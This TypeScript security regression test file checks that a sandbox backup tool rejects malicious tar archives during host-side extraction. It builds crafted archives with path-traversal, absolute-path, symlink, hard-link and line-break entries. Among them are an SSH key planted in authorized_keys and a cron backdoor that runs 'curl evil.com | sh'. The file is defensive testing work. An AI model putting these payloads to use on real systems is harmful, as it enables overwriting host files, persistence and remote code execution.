// SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
// SPDX-License-Identifier: Apache-2.0
//
// Security regression test: Host-side tar extraction path traversal.
//
// backupSandboxState() downloads a tar archive from inside the sandbox and
// extracts it on the host. Without validation, a compromised sandbox can
// craft a tar with path-traversal entries (../../.ssh/authorized_keys),
// absolute paths, or symlinks to write arbitrary files on the host.
//
// The fix validates all tar entry paths before extraction and audits
// symlinks after extraction.

import { spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";

import { runTarListing } from "../../src/lib/state/tar-listing";

const HOST_TAR_SUPPORTS_LITERAL_QUOTING =
  spawnSync("tar", ["--quoting-style=literal", "-tf", "-"], {
    input: Buffer.alloc(1024),
  }).status === 0;

function listedRawTarName(name: string): string {
  return HOST_TAR_SUPPORTS_LITERAL_QUOTING ? name : name.replaceAll("\\", "\\\\");
}

// ═══════════════════════════════════════════════════════════════════
// Helpers — tar archive construction
// ═══════════════════════════════════════════════════════════════════

/**
 * Build a tar header block (512 bytes) for a single entry.
 * Implements the POSIX ustar format at the minimum level needed for tests.
 */
function tarHeader(
  entryPath: string,
  content: Buffer,
  opts: { type?: string; linkTarget?: string } = {},
): Buffer {
  const header = Buffer.alloc(512, 0);
  const type = opts.type || "0"; // '0' = regular file, '2' = symlink, '5' = directory

  // Name (bytes 0-99)
  header.write(entryPath, 0, Math.min(Buffer.byteLength(entryPath, "utf-8"), 100), "utf-8");

  // Mode (bytes 100-107)
  header.write("0000644\0", 100, 8, "utf-8");

  // UID/GID (bytes 108-123)
  header.write("0001000\0", 108, 8, "utf-8");
  header.write("0001000\0", 116, 8, "utf-8");

  // Size (bytes 124-135) — 0 for symlinks/dirs
  const size = ["0", "x", "g", "L", "K"].includes(type) ? content.length : 0;
  header.write(size.toString(8).padStart(11, "0") + "\0", 124, 12, "utf-8");

  // Mtime (bytes 136-147)
  const mtime = Math.floor(Date.now() / 1000);
  header.write(mtime.toString(8).padStart(11, "0") + "\0", 136, 12, "utf-8");

  // Type flag (byte 156)
  header.write(type, 156, 1, "utf-8");

  // Link name (bytes 157-256) — for symlinks
  if (opts.linkTarget) {
    header.write(
      opts.linkTarget,
      157,
      Math.min(Buffer.byteLength(opts.linkTarget, "utf-8"), 100),
      "utf-8",
    );
  }

  // USTAR magic (bytes 257-264)
  header.write("ustar\0", 257, 6, "utf-8");
  header.write("00", 263, 2, "utf-8");

  // Compute checksum (bytes 148-155)
  // First fill checksum field with spaces
  header.fill(0x20, 148, 156);
  let checksum = 0;
  for (let i = 0; i < 512; i++) {
    checksum += header[i];
  }
  header.write(checksum.toString(8).padStart(6, "0") + "\0 ", 148, 8, "utf-8");

  return header;
}

/**
 * Build a complete tar archive buffer from an array of entries.
 */
function buildTar(
  entries: Array<{
    path: string;
    content?: string;
    type?: string;
    linkTarget?: string;
  }>,
): Buffer {
  const blocks: Buffer[] = [];

  for (const entry of entries) {
    const content = Buffer.from(entry.content || "", "utf-8");
    const header = tarHeader(entry.path, content, {
      type: entry.type || "0",
      linkTarget: entry.linkTarget,
    });
    blocks.push(header);

    if (["0", "x", "g", "L", "K"].includes(entry.type || "0") && content.length > 0) {
      // Data blocks (padded to 512-byte boundary)
      const paddedSize = Math.ceil(content.length / 512) * 512;
      const dataBlock = Buffer.alloc(paddedSize, 0);
      content.copy(dataBlock);
      blocks.push(dataBlock);
    }
  }

  // End-of-archive: two 512-byte zero blocks
  blocks.push(Buffer.alloc(1024, 0));

  return Buffer.concat(blocks);
}

function paxRecord(key: string, value: string): string {
  const body = ` ${key}=${value}\n`;
  let length = Buffer.byteLength(body, "utf-8") + 1;
  while (Buffer.byteLength(`${length}${body}`, "utf-8") !== length) {
    length = Buffer.byteLength(`${length}${body}`, "utf-8");
  }
  return `${length}${body}`;
}

/**
 * Import the actual validation/extraction functions from the source.
 */
type SandboxStateModule = Pick<
  typeof import("../../src/lib/state/sandbox.js"),
  | "validateTarEntries"
  | "nativeTarInventoryViolation"
  | "rejectHardLinks"
  | "rejectHardLinkExtractionTraversal"
  | "rejectSymlinkExtractionTraversal"
>;

function isSandboxStateModule(
  value: object | null,
): value is typeof import("../../src/lib/state/sandbox.js") {
  return (
    value !== null &&
    typeof Reflect.get(value, "validateTarEntries") === "function" &&
    typeof Reflect.get(value, "rejectHardLinks") === "function" &&
    typeof Reflect.get(value, "rejectHardLinkExtractionTraversal") === "function" &&
    typeof Reflect.get(value, "rejectSymlinkExtractionTraversal") === "function"
  );
}

async function loadSandboxState(): Promise<SandboxStateModule> {
  // Load source through the integration project's CommonJS hook.
  const loaded = await import(
    path.join(import.meta.dirname, "../..", "src", "lib", "state", "sandbox.ts")
  );
  const mod = typeof loaded === "object" && loaded !== null ? loaded : null;
  if (!isSandboxStateModule(mod)) {
    throw new Error("Expected sandbox-state module exports to be available");
  }
  return {
    validateTarEntries: mod.validateTarEntries,
    nativeTarInventoryViolation: mod.nativeTarInventoryViolation,
    rejectHardLinks: mod.rejectHardLinks,
    rejectHardLinkExtractionTraversal: mod.rejectHardLinkExtractionTraversal,
    rejectSymlinkExtractionTraversal: mod.rejectSymlinkExtractionTraversal,
  };
}

// ═══════════════════════════════════════════════════════════════════
// 1. PoC — demonstrate that malicious tar entries are dangerous
// ═══════════════════════════════════════════════════════════════════
//
// NOTE: bsdtar (macOS) strips ../  and / by default, so these PoC tests
// verify the *archive contents* are malicious rather than relying on
// platform-specific extraction behavior. The fix must work on all
// platforms, including Linux where GNU tar DOES follow traversal paths.
// ═══════════════════════════════════════════════════════════════════
describe("PoC: malicious tar archives contain path traversal entries", () => {
  it("tar archive contains a ../../ traversal entry", () => {
    const tar = buildTar([{ path: "../../evil.txt", content: "attacker-payload" }]);

    // Verify the archive actually contains the traversal entry
    const list = spawnSync("tar", ["-tf", "-"], {
      input: tar,
      encoding: "utf-8",
      stdio: ["pipe", "pipe", "pipe"],
    });

    const entries = (list.stdout || "").trim().split("\n");
    // The entry path should contain the traversal (tar lists it as-is)
    expect(entries.some((e) => e.includes("..") || e.includes("evil.txt"))).toBe(true);
  });

  it("tar archive contains an absolute path entry", () => {
    const tar = buildTar([{ path: "/etc/cron.d/backdoor", content: "malicious" }]);

    const list = spawnSync("tar", ["-tf", "-"], {
      input: tar,
      encoding: "utf-8",
      stdio: ["pipe", "pipe", "pipe"],
    });

    const entries = (list.stdout || "").trim().split("\n");
    expect(entries.some((e) => e.startsWith("/") || e.includes("etc/cron.d"))).toBe(true);
  });
});

// ═══════════════════════════════════════════════════════════════════
// 2. Fix — validateTarEntries rejects malicious archives
// ═══════════════════════════════════════════════════════════════════
describe("Fix: validateTarEntries rejects malicious tar entries", () => {
  it("rejects relative path traversal (../../.ssh/authorized_keys)", async () => {
    const { validateTarEntries } = await loadSandboxState();
    const targetDir = "/tmp/nemoclaw-test-target";
    const tar = buildTar([{ path: "../../.ssh/authorized_keys", content: "ssh-rsa ATTACKER_KEY" }]);

    const result = validateTarEntries(tar, targetDir);

    expect(result.safe).toBe(false);
    expect(result.violations.length).toBeGreaterThan(0);
    expect(result.violations[0]).toContain("path traversal");
  });

  it("rejects absolute path (/etc/cron.d/backdoor)", async () => {
    const { validateTarEntries } = await loadSandboxState();
    const targetDir = "/tmp/nemoclaw-test-target";
    const tar = buildTar([
      {
        path: "/etc/cron.d/backdoor",
        content: "* * * * * root curl evil.com | sh",
      },
    ]);

    const result = validateTarEntries(tar, targetDir);

    expect(result.safe).toBe(false);
    expect(result.violations.some((v) => v.includes("absolute path"))).toBe(true);
  });

  it("rejects hidden traversal (safe-dir/../../escape.txt)", async () => {
    const { validateTarEntries } = await loadSandboxState();
    const targetDir = "/tmp/nemoclaw-test-target";
    const tar = buildTar([{ path: "safe-dir/../../escape.txt", content: "hidden-traversal" }]);

    const result = validateTarEntries(tar, targetDir);

    expect(result.safe).toBe(false);
    expect(result.violations.some((v) => v.includes("path traversal"))).toBe(true);
  });

  it("accepts legitimate entries within target directory", async () => {
    const { validateTarEntries } = await loadSandboxState();
    const targetDir = "/tmp/nemoclaw-test-target";
    const tar = buildTar([
      { path: "workspace/config.json", content: '{"key": "value"}' },
      { path: "workspace/memory/data.db", content: "db-content" },
      { path: "settings.yaml", content: "setting: true" },
    ]);

    const result = validateTarEntries(tar, targetDir);

    expect(result.safe).toBe(true);
    expect(result.violations.length).toBe(0);
    expect(result.entries.length).toBe(3);
  });

  it("validates an already-open archive after its pathname is removed", async () => {
    const {
      rejectHardLinkExtractionTraversal,
      rejectSymlinkExtractionTraversal,
      validateTarEntries,
    } = await loadSandboxState();
    const workDir = fs.mkdtempSync(path.join(os.tmpdir(), "nemoclaw-descriptor-tar-"));
    const archivePath = path.join(workDir, "native-home.tar");
    fs.writeFileSync(archivePath, buildTar([{ path: "workspace/state.json", content: "{}" }]));
    const descriptor = fs.openSync(archivePath, fs.constants.O_RDONLY | fs.constants.O_NOFOLLOW);
    try {
      fs.unlinkSync(archivePath);

      const source = { fileDescriptor: descriptor };
      const validation = validateTarEntries(source, "/sandbox");
      expect(validation).toMatchObject({
        safe: true,
        entries: ["workspace/state.json"],
      });
      expect(rejectSymlinkExtractionTraversal(source, validation.entries)).toEqual([]);
      expect(rejectHardLinkExtractionTraversal(source, validation.entries)).toEqual([]);
    } finally {
      fs.closeSync(descriptor);
      fs.rmSync(workDir, { recursive: true, force: true });
    }
  });

  it("rejects mixed archive if any entry is malicious", async () => {
    const { validateTarEntries } = await loadSandboxState();
    const targetDir = "/tmp/nemoclaw-test-target";
    const tar = buildTar([
      { path: "legitimate/config.json", content: "{}" },
      { path: "../../.bashrc", content: 'echo "pwned"' },
      { path: "legitimate/data.txt", content: "safe" },
    ]);

    const result = validateTarEntries(tar, targetDir);

    expect(result.safe).toBe(false);
    expect(result.violations.length).toBe(1);
    expect(result.violations[0]).toContain("../../.bashrc");
  });

  it("lists raw backslash names consistently while rejecting traversal", async () => {
    const { validateTarEntries } = await loadSandboxState();
    const targetDir = "/tmp/nemoclaw-test-target";
    const backslashEntry = "workspace/05-\u{1F6E0}\u{FE0F}\\ Systems\\ \\&\\ Templates/.env";
    const valid = validateTarEntries(
      buildTar([{ path: backslashEntry, content: "CUSTOM_MODE=enabled\n" }]),
      targetDir,
    );

    expect(valid).toEqual({
      safe: true,
      entries: [listedRawTarName(backslashEntry)],
      violations: [],
    });

    const escaping = validateTarEntries(
      buildTar([{ path: "workspace/back\\slash/../../../escape.txt", content: "escape" }]),
      targetDir,
    );

    expect(escaping.safe).toBe(false);
    expect(escaping.violations[0]).toContain(
      `path traversal: ${listedRawTarName("workspace/back\\slash/../../../escape.txt")}`,
    );
  });

  it("rejects archive headers whose entry path or link target contains a line break", async () => {
    const { validateTarEntries } = await loadSandboxState();
    const targetDir = "/tmp/nemoclaw-test-target";
    const newlinePath = validateTarEntries(
      buildTar([{ path: "workspace/line\nbreak.txt", content: "payload" }]),
      targetDir,
    );
    expect(newlinePath).toEqual({
      safe: false,
      entries: [],
      violations: [
        'tar listing failed: archive entry contains a line break: "workspace/line\\nbreak.txt"',
      ],
    });

    const carriageReturnTarget = validateTarEntries(
      buildTar([{ path: "workspace/link", type: "2", linkTarget: "target\rname" }]),
      targetDir,
    );
    expect(carriageReturnTarget).toEqual({
      safe: false,
      entries: [],
      violations: ['tar listing failed: archive entry contains a line break: "target\\rname"'],
    });
  });

  it("rejects an archive whose PAX linkpath or sparse name contains a line break", async () => {
    const { validateTarEntries } = await loadSandboxState();
    const targetDir = "/tmp/nemoclaw-test-target";
    const linkpathTar = buildTar([
      {
        path: "PaxHeaders/link",
        type: "x",
        content: paxRecord("linkpath", "workspace/line\nbreak"),
      },
      { path: "workspace/link", type: "1", linkTarget: "workspace/placeholder" },
    ]);

    expect(validateTarEntries(linkpathTar, targetDir)).toEqual({
      safe: false,
      entries: [],
      violations: [
        'tar listing failed: archive entry contains a line break: "workspace/line\\nbreak"',
      ],
    });

    const sparseNameTar = buildTar([
      {
        path: "PaxHeaders/sparse",
        type: "x",
        content: paxRecord("GNU.sparse.name", "workspace/sparse\r\nname"),
      },
      { path: "workspace/sparse", content: "x" },
    ]);

    expect(validateTarEntries(sparseNameTar, targetDir)).toEqual({
      safe: false,
      entries: [],
      violations: [
        'tar listing failed: archive entry contains a line break: "workspace/sparse\\r\\nname"',
      ],
    });
  });

  it("rejects an archive whose GNU long link name contains a line break", async () => {
    const { validateTarEntries } = await loadSandboxState();
    const targetDir = "/tmp/nemoclaw-test-target";
    const tar = buildTar([
      { path: "././@LongLink", type: "K", content: "workspace/long\nlink\0" },
      { path: "workspace/link", type: "2", linkTarget: "workspace/placeholder" },
    ]);

    expect(validateTarEntries(tar, targetDir)).toEqual({
      safe: false,
      entries: [],
      violations: [
        'tar listing failed: archive entry contains a line break: "workspace/long\\nlink"',
      ],
    });
  });

  it("rejects an archive whose extended header exceeds the line-break inspection limit", async () => {
    const { validateTarEntries } = await loadSandboxState();
    const targetDir = "/tmp/nemoclaw-test-target";
    const tar = buildTar([
      {
        path: "PaxHeaders/oversized",
        type: "x",
        content: paxRecord("comment", "a".repeat(1024 * 1024 + 1)),
      },
      { path: "workspace/state.json", content: "{}" },
    ]);

    expect(validateTarEntries(tar, targetDir)).toEqual({
      safe: false,
      entries: [],
      violations: ["tar listing failed: archive header cannot be inspected for line breaks"],
    });
  });

  it("accepts many bounded extended headers without an aggregate metadata ceiling", async () => {
    const { validateTarEntries, nativeTarInventoryViolation } = await loadSandboxState();
    const targetDir = "/tmp/nemoclaw-test-target";
    const metadataChunk = paxRecord("comment", "a".repeat(1024));
    const entries = Array.from({ length: 4200 }, (_, index) => [
      {
        path: `PaxHeaders/member-${index}`,
        type: "x",
        content: metadataChunk,
      },
      { path: `workspace/member-${index}.json`, content: "{}" },
    ]).flat();

    const archive = buildTar(entries);
    let nameFormat: "literal" | "escaped-backslashes" | null = null;
    const validation = validateTarEntries(archive, targetDir, undefined, undefined, (format) => {
      nameFormat = format;
    });
    expect(validation.safe, validation.violations.join("; ")).toBe(true);
    expect(validation.entries).toHaveLength(4200);
    expect(validation.entries.at(-1)).toBe("workspace/member-4199.json");
    const fixture = fs.mkdtempSync(path.join(os.tmpdir(), "nemoclaw-many-pax-inventory-"));
    try {
      const archivePath = path.join(fixture, "source.tar");
      fs.writeFileSync(archivePath, archive);
      expect(nativeTarInventoryViolation(archivePath, validation.entries, nameFormat)).toBeNull();
    } finally {
      fs.rmSync(fixture, { recursive: true, force: true });
    }
  });

  it("stops tar at the configured output bound without retaining a listing file", async () => {
    const { validateTarEntries } = await loadSandboxState();
    const targetDir = "/tmp/nemoclaw-test-target";
    const fixture = fs.mkdtempSync(path.join(os.tmpdir(), "nemoclaw-tar-output-bound-"));
    const oldPath = process.env.PATH;
    const existingListingDirs = new Set(
      fs.readdirSync(os.tmpdir()).filter((entry) => entry.startsWith("nemoclaw-tar-listing-")),
    );
    try {
      const countFile = path.join(fixture, "chunks.txt");
      const fakeTar = path.join(fixture, "tar");
      fs.writeFileSync(
        fakeTar,
        [
          "#!/usr/bin/env node",
          'const fs = require("node:fs");',
          "let chunks = 0;",
          "const timer = setInterval(() => {",
          "  chunks += 1;",
          `  fs.writeFileSync(${JSON.stringify(countFile)}, String(chunks));`,
          '  fs.writeSync(1, "workspace/member-" + String(chunks).padStart(4, "0") + ".txt\\n");',
          "  chunks >= 200 && clearInterval(timer);",
          "}, 5);",
        ].join("\n"),
        { mode: 0o755 },
      );
      process.env.PATH = `${fixture}:${oldPath ?? ""}`;

      const tar = buildTar([{ path: "workspace/state.json", content: "{}" }]);
      expect(validateTarEntries(tar, targetDir, undefined, 64)).toEqual({
        safe: false,
        entries: [],
        violations: ["tar listing exceeded 64 bytes"],
      });
      expect(Number(fs.readFileSync(countFile, "utf8"))).toBeLessThan(20);
      expect(
        fs
          .readdirSync(os.tmpdir())
          .filter(
            (entry) => entry.startsWith("nemoclaw-tar-listing-") && !existingListingDirs.has(entry),
          ),
      ).toEqual([]);
    } finally {
      oldPath === undefined
        ? Reflect.deleteProperty(process.env, "PATH")
        : Reflect.set(process.env, "PATH", oldPath);
      fs.rmSync(fixture, { recursive: true, force: true });
    }
  });
});

describe("tar listing executable and timeout diagnostics", () => {
  let fixture: string;
  let originalPath: string | undefined;

  beforeEach(() => {
    fixture = fs.mkdtempSync(path.join(os.tmpdir(), "nemoclaw-tar-executable-"));
    originalPath = process.env.PATH;
    process.env.PATH = `${fixture}${path.delimiter}${originalPath ?? ""}`;
  });

  afterEach(() => {
    originalPath === undefined
      ? Reflect.deleteProperty(process.env, "PATH")
      : Reflect.set(process.env, "PATH", originalPath);
    fs.rmSync(fixture, { recursive: true, force: true });
  });

  it("invokes a PATH tar symlink by its selected name", () => {
    const tarPath = path.join(fixture, "tar");
    const realTar = path.join(fixture, "real-tar");
    fs.writeFileSync(
      realTar,
      `#!/usr/bin/env node\nif (process.argv[1] !== ${JSON.stringify(tarPath)}) process.exit(7);\nprocess.stdout.write("workspace/item.txt\\n");\n`,
      { mode: 0o755 },
    );
    fs.symlinkSync(realTar, tarPath);
    const entries: string[] = [];

    expect(
      runTarListing(buildTar([]), ["-tf", "-"], "tar listing", (line) => entries.push(line)),
    ).toBeNull();
    expect(entries).toEqual(["workspace/item.txt"]);
  });

  it("reports the initial tar spawn timeout as an archive-listing timeout", () => {
    fs.writeFileSync(
      path.join(fixture, "tar"),
      "#!/usr/bin/env node\nsetTimeout(() => {}, 5000);\n",
      {
        mode: 0o755,
      },
    );

    expect(runTarListing(buildTar([]), ["-tf", "-"], "tar listing", () => {}, 1000)).toBe(
      "tar listing failed: archive listing timed out",
    );
  });

  it("reports the fallback tar spawn timeout as an archive-listing timeout", () => {
    const fallbackMarker = path.join(fixture, "fallback-entered");
    fs.writeFileSync(
      path.join(fixture, "tar"),
      `#!/usr/bin/env node\nconst fs = require("node:fs");\nif (process.argv.includes("--quoting-style=literal")) { console.error("unsupported quoting-style"); process.exit(2); }\nfs.writeFileSync(${JSON.stringify(fallbackMarker)}, "entered");\nsetTimeout(() => {}, 5000);\n`,
      { mode: 0o755 },
    );

    expect(runTarListing(buildTar([]), ["-tf", "-"], "tar listing", () => {}, 1000)).toBe(
      "tar listing failed: archive listing timed out",
    );
    expect(fs.readFileSync(fallbackMarker, "utf8")).toBe("entered");
  });
});

describe("Fix: rejectHardLinks blocks hard-link entries at validation time", () => {
  it("rejects a hard-link entry targeting outside the archive", async () => {
    const { rejectHardLinks } = await loadSandboxState();

    // Build a tar archive with a hard-link entry (type '1')
    const tar = buildTar([
      { path: "inside/config.json", type: "1", linkTarget: "../outside.json" },
    ]);

    const violations = rejectHardLinks(tar);

    expect(violations.length).toBeGreaterThan(0);
    expect(violations[0]).toContain("hard link");
  });

  it("rejects a hard-link entry targeting within the archive", async () => {
    const { rejectHardLinks } = await loadSandboxState();

    // Even internal hard links are rejected — no legitimate use in state backups
    const tar = buildTar([
      { path: "data/original.txt", content: "payload" },
      { path: "data/hardlink.txt", type: "1", linkTarget: "data/original.txt" },
    ]);

    const violations = rejectHardLinks(tar);

    expect(violations.length).toBeGreaterThan(0);
    expect(violations[0]).toContain("hard link");
  });

  it("accepts archive with no hard links", async () => {
    const { rejectHardLinks } = await loadSandboxState();

    const tar = buildTar([
      { path: "workspace/config.json", content: '{"key":"value"}' },
      { path: "workspace/data.db", content: "db-content" },
    ]);

    const violations = rejectHardLinks(tar);

    expect(violations.length).toBe(0);
  });

  it("accepts a large archive whose verbose listing exceeds Node's default spawn buffer", async () => {
    const { rejectHardLinks } = await loadSandboxState();
    const entries = Array.from({ length: 20_000 }, (_, index) => ({
      path: `workspace/file-${index.toString().padStart(5, "0")}.txt`,
      content: "x",
    }));

    const violations = rejectHardLinks(buildTar(entries));

    expect(violations).toEqual([]);
  });

  it("accepts a large archive whose path listing exceeds Node's default spawn buffer", async () => {
    const { validateTarEntries } = await loadSandboxState();
    const targetDir = fs.mkdtempSync(path.join(os.tmpdir(), "nemoclaw-large-listing-"));
    try {
      const entries = Array.from({ length: 20_000 }, (_, index) => ({
        path: `workspace/${index.toString().padStart(5, "0")}-${"segment".repeat(10)}.txt`,
        content: "x",
      }));

      const result = validateTarEntries(buildTar(entries), targetDir);

      expect(result.safe).toBe(true);
      expect(result.violations).toEqual([]);
      expect(result.entries).toHaveLength(entries.length);
    } finally {
      fs.rmSync(targetDir, { recursive: true, force: true });
    }
  });
});

describe("Fix: stopped-state extraction cannot write through archive symlinks", () => {
  it("rejects a symlink followed by a nested archive member", async () => {
    const { rejectSymlinkExtractionTraversal, validateTarEntries } = await loadSandboxState();
    const tar = buildTar([
      { path: "redirect", type: "2", linkTarget: "../outside" },
      { path: "redirect/payload.txt", content: "must stay contained" },
    ]);
    const validation = validateTarEntries(tar, "/tmp/private-stopped-state");

    expect(validation.safe).toBe(true);
    expect(rejectSymlinkExtractionTraversal(tar, validation.entries)).toEqual([
      "archive member 'redirect/payload.txt' would extract through symlink 'redirect'",
    ]);
  });

  it("preserves a standalone native symlink when no archive member traverses it", async () => {
    const { rejectSymlinkExtractionTraversal, validateTarEntries } = await loadSandboxState();
    const tar = buildTar([
      { path: "workspace/settings.json", content: "{}" },
      { path: "current-logs", type: "2", linkTarget: "/var/log/agent" },
    ]);
    const validation = validateTarEntries(tar, "/tmp/private-stopped-state");

    expect(validation.safe).toBe(true);
    expect(rejectSymlinkExtractionTraversal(tar, validation.entries)).toEqual([]);
  });

  it("rejects a hard-link target below an earlier archive symlink", async () => {
    const { rejectHardLinkExtractionTraversal, validateTarEntries } = await loadSandboxState();
    const tar = buildTar([
      { path: "home", type: "2", linkTarget: "/home/operator" },
      { path: "stolen", type: "1", linkTarget: "home/.config/secret" },
    ]);
    const validation = validateTarEntries(tar, "/tmp/private-stopped-state");

    expect(validation.safe).toBe(true);
    expect(rejectHardLinkExtractionTraversal(tar, validation.entries)).toEqual([
      "hard-link target 'home/.config/secret' in 'stolen' resolves through symlink 'home'",
    ]);
  });

  it("allows a contained hard link whose target does not traverse a symlink", async () => {
    const { rejectHardLinkExtractionTraversal, validateTarEntries } = await loadSandboxState();
    const tar = buildTar([
      { path: "workspace/source", content: "state" },
      { path: "workspace/copy", type: "1", linkTarget: "workspace/source" },
    ]);
    const validation = validateTarEntries(tar, "/tmp/private-stopped-state");

    expect(validation.safe).toBe(true);
    expect(rejectHardLinkExtractionTraversal(tar, validation.entries)).toEqual([]);
  });

  it("rejects symlink and hard-link traversal when archive paths contain backslashes", async () => {
    const {
      rejectHardLinkExtractionTraversal,
      rejectSymlinkExtractionTraversal,
      validateTarEntries,
    } = await loadSandboxState();
    const symlinkTar = buildTar([
      { path: "workspace/sym\\link", type: "2", linkTarget: "../../outside" },
      { path: "workspace/sym\\link/payload.txt", content: "must stay contained" },
    ]);
    const symlinkValidation = validateTarEntries(symlinkTar, "/tmp/private-stopped-state");

    expect(symlinkValidation.safe).toBe(true);
    expect(rejectSymlinkExtractionTraversal(symlinkTar, symlinkValidation.entries)).toEqual([
      `archive member '${listedRawTarName("workspace/sym\\link/payload.txt")}' would extract through symlink '${listedRawTarName("workspace/sym\\link")}'`,
    ]);

    const hardLinkTar = buildTar([
      { path: "workspace/sym\\link", type: "2", linkTarget: "/home/operator" },
      { path: "workspace/stolen", type: "1", linkTarget: "workspace/sym\\link/.config/secret" },
    ]);
    const hardLinkValidation = validateTarEntries(hardLinkTar, "/tmp/private-stopped-state");

    expect(hardLinkValidation.safe).toBe(true);
    expect(rejectHardLinkExtractionTraversal(hardLinkTar, hardLinkValidation.entries)).toEqual([
      `hard-link target '${listedRawTarName("workspace/sym\\link/.config/secret")}' in 'workspace/stolen' resolves through symlink '${listedRawTarName("workspace/sym\\link")}'`,
    ]);
  });

  it("lists without --quoting-style=literal after tar rejects it and retries the option after the tar executable changes", async () => {
    const {
      rejectHardLinkExtractionTraversal,
      rejectSymlinkExtractionTraversal,
      validateTarEntries,
    } = await loadSandboxState();
    const fixture = fs.mkdtempSync(path.join(os.tmpdir(), "nemoclaw-tar-fallback-"));
    const oldPath = process.env.PATH;
    try {
      const systemTar = spawnSync("sh", ["-c", "command -v tar"], {
        encoding: "utf8",
      }).stdout.trim();
      expect(systemTar).not.toBe("");
      const literalQuotingSupported =
        spawnSync(systemTar, ["--quoting-style=literal", "-tf", "-"], {
          input: Buffer.alloc(1024),
        }).status === 0;
      const fakeTar = path.join(fixture, "tar");
      fs.writeFileSync(
        fakeTar,
        [
          "#!/usr/bin/env node",
          'const { spawnSync } = require("node:child_process");',
          "const args = process.argv.slice(2);",
          'if (args.includes("--quoting-style=literal")) { process.stderr.write("tar: Option --quoting-style=literal is not supported\\n"); process.exit(1); }',
          `process.exit(spawnSync(${JSON.stringify(systemTar)}, args, { stdio: "inherit" }).status ?? 90);`,
        ].join("\n"),
        { mode: 0o755 },
      );
      process.env.PATH = `${fixture}:${oldPath ?? ""}`;

      const safeEntry = "workspace/back\\slash/.env";
      const escapedSafeEntry = safeEntry.replaceAll("\\", "\\\\");
      const safeTar = buildTar([{ path: safeEntry, content: "CUSTOM_MODE=enabled\n" }]);
      expect(validateTarEntries(safeTar, "/tmp/private-stopped-state")).toEqual({
        safe: true,
        entries: [escapedSafeEntry],
        violations: [],
      });

      const symlinkTar = buildTar([
        { path: "workspace/sym\\link", type: "2", linkTarget: "../../outside" },
        { path: "workspace/sym\\link/payload.txt", content: "must stay contained" },
      ]);
      const symlinkValidation = validateTarEntries(symlinkTar, "/tmp/private-stopped-state");
      expect(symlinkValidation.safe).toBe(true);
      expect(rejectSymlinkExtractionTraversal(symlinkTar, symlinkValidation.entries)).toEqual([
        "archive member 'workspace/sym\\\\link/payload.txt' would extract through symlink 'workspace/sym\\\\link'",
      ]);

      const hardLinkTar = buildTar([
        { path: "workspace/sym\\link", type: "2", linkTarget: "/home/operator" },
        { path: "workspace/stolen", type: "1", linkTarget: "workspace/sym\\link/.config/secret" },
      ]);
      const hardLinkValidation = validateTarEntries(hardLinkTar, "/tmp/private-stopped-state");
      expect(hardLinkValidation.safe).toBe(true);
      expect(rejectHardLinkExtractionTraversal(hardLinkTar, hardLinkValidation.entries)).toEqual([
        "hard-link target 'workspace/sym\\\\link/.config/secret' in 'workspace/stolen' resolves through symlink 'workspace/sym\\\\link'",
      ]);

      const replacementTar = path.join(fixture, "gnu-like-tar");
      fs.writeFileSync(
        replacementTar,
        [
          "#!/usr/bin/env node",
          'const { spawnSync } = require("node:child_process");',
          "const args = process.argv.slice(2);",
          'if (!args.includes("--quoting-style=literal")) { process.stderr.write("missing --quoting-style=literal\\n"); process.exit(2); }',
          `const forwarded = ${JSON.stringify(literalQuotingSupported)} ? args : args.filter((arg) => arg !== "--quoting-style=literal");`,
          `process.exit(spawnSync(${JSON.stringify(systemTar)}, forwarded, { stdio: "inherit" }).status ?? 90);`,
        ].join("\n"),
        { mode: 0o755 },
      );
      fs.unlinkSync(fakeTar);
      fs.symlinkSync(replacementTar, fakeTar);

      expect(validateTarEntries(safeTar, "/tmp/private-stopped-state")).toEqual({
        safe: true,
        entries: [listedRawTarName(safeEntry)],
        violations: [],
      });
    } finally {
      oldPath === undefined
        ? Reflect.deleteProperty(process.env, "PATH")
        : Reflect.set(process.env, "PATH", oldPath);
      fs.rmSync(fixture, { recursive: true, force: true });
    }
  });
});
